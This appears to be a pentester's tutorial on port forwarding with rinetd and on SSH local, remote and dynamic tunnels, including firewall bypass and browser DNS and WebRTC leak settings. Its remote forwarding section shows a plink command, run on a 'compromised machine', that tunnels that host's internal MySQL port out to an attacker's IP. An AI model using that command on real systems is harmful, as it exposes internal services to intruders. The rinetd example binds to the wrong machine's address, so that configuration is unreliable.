# Port forwarding and tunneling


## Port forwarding

So imagine that you are on a network and you want to connect to a ftp server (or any other port) to upload or download some files. But someone has put some crazy firewall rules (egress filters) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server?

What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine.

So instead of having this kind of traffic 

```
home-computer/port-21 ----> ftp-server/port-21
```

we will have

```
home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server
```

And the other way around of course, to receive the traffic.

Okay, so how do we go about actually implementing this?

### Rinetd - Port forward/redirect

So we can set up this port forwaring machine with the help of rinetd.

To make it clear, we have the following machines:
Machine1 - IP: 111.111.111.111 - Behind firewall, and wants to connect to Machine3.
Machine2 - IP: 222.222.222.222 - Forwards incomming connections to Machine3 
Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants to connect to.

```
apt-get install rinetd
```

This is the default config file

```
cat /etc/rinetd.conf 
#
# this is the configuration file for rinetd, the internet redirection server
#
# you may specify global allow and deny rules here
# only ip addresses are matched, hostnames cannot be specified here
# the wildcards you may use are * and ?
#
# allow 192.168.2.*
# deny 192.168.2.1?


#
# forwarding rules come here
#
# you may specify allow and deny rules after a specific forwarding rule
# to apply to only that forwarding rule
#
# bindadress    bindport  connectaddress  connectport


# logging information
logfile /var/log/rinetd.log

# uncomment the following line if you want web-server style logfile format
# logcommon
```

This is the essential part of the configuration file, this is where we create the port-forwarding
```
# bindadress    bindport  connectaddress  connectport
111.111.111.111    80     333.333.333.333       21
```

```
/etc/init.d/rinetd restart
```

So the bind-address is where the proxy receieves the connection, and the connectaddress is the machine it forwards the connection to.

## SSH Tunneling - Port forwarding on SSH

**Use cases**
- You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC.
- You are on a public network and want to encrypt all your http traffic.
- You want to bypass firewall rules.


### Local port forwarding

Now facebook will be available on address localhost:8080.

```
ssh -L 8080:www.facebook.com:80 localhost
```


### Remote port forwarding

Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following:

Here is how you create a remote port forwarding
```
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```



By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is **111.111.111.111**.

So on our compromised machine we do:

```
plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306
```

Now we can check netstat on our attacking machine, we should see something like this:

```
tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      19392/sshd: root@pt 
```
That means what we can connect to that port on the attacking machine from the attacking machine.

Connect using the following command:

```
mysql -u root -p -h 127.0.0.1 --port=3307
```


### Dynamic port forwarding

This can be used to dynamically forward all traffic from a specific application. 

#### Tunnel all http/https traffic through ssh

For this we need two machines.
Machine1 - 111.111.1111.111 - The server that works as our proxy.
Machine2 - The computer with the web browser.

First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works.
First you set ssh to 

```
# On Machine2 we run
ssh -D localhost:9999 root@111.111.111.111

# Can also be run with the -N flag
ssh -D localhost:9999 root@111.111.111.111 -N

```

Now you go to Firefox/settings/advanced/network and **SOCKS** you add 
**127.0.0.1** and port **9999**

Notice that this setup probably leaks DNS. So don't use it if you need opsec.

To fix the DNS-leak you can go to **about:config** in firefox (in the addressbar) then look for **network.proxy.socks_remote_dns**, and switch it to **TRUE**. Now you can check: https://ipleak.net/

But we are not done yet. It still says that we have **WebRTC leaks**. In order to solve this you can go to about:config again and set the following to **FALSE**

**media.peerconnection.enabled**

## References

